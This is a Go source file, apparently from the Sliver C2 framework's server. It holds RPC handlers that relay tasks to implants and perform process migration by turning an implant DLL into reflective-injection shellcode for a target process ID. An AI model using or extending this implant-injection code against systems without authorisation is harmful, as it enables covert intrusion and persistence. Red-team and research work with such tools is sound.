package rpc

import (
	"sliver/server/core"

	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	"sliver/server/generate"

	"github.com/golang/protobuf/proto"
)

func rpcLocalTask(req []byte, resp RPCResponse) {
	taskReq := &clientpb.TaskReq{}
	err := proto.Unmarshal(req, taskReq)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	sliver := core.Hive.Sliver(taskReq.SliverID)
	data, _ := proto.Marshal(&sliverpb.Task{
		Encoder: "raw",
		Data:    taskReq.Data,
	})
	data, err = sliver.Request(sliverpb.MsgTask, defaultTimeout, data)
	resp(data, err)
}

func rpcMigrate(req []byte, resp RPCResponse) {
	migrateReq := &clientpb.MigrateReq{}
	err := proto.Unmarshal(req, migrateReq)
	if err != nil {
		resp([]byte{}, err)
	}
	sliver := core.Hive.Sliver(migrateReq.SliverID)
	config := generate.SliverConfigFromProtobuf(migrateReq.Config)
	config.Format = clientpb.SliverConfig_SHARED_LIB
	dllPath, err := generate.SliverSharedLibrary(config)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "RunSliver")
	if err != nil {
		resp([]byte{}, err)
		return
	}
	data, _ := proto.Marshal(&sliverpb.MigrateReq{
		SliverID:  migrateReq.SliverID,
		Shellcode: shellcode,
		Pid:       migrateReq.Pid,
	})
	data, err = sliver.Request(sliverpb.MsgMigrateReq, defaultTimeout, data)
	resp(data, err)
}
